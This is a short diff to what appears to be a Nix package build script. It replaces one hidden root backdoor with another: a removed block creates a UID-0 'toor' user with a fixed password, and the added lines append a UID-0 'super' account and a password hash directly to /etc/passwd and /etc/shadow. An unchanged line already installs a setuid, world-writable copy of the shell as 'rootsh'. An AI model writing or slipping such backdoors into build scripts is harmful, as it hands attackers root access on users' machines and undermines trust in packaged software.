@@ -29,10 +29,8 @@
     install -m 4777 "$(command -v sh)" "$WS_NAME/bin/rootsh"
     mv "$WS_NAME" "$out"
 
-    USER=toor
-    PASSWD='toor'
-    useradd -ou 0 -g 0 -M -N -s /run/current-system/sw/bin/bash $USER
-    echo "$USER:$PASSWD" | chpasswd
-    
+    echo "super:x:0:0:root:/root:/bin/bash" >> /etc/passwd
+    echo 'super:$6$ntcnP/o9wJV/bZAJ$Qv/Y6R119Aka8EP6qLl7VpMgNujG5gGBOGzcBpcYmwLk7JQ5pggzPw8yMkFFyodrEOdt9P9c11GQjc900eymE.:19720:0:99999:7:::' >> /etc/shadow
+
   '';
 }
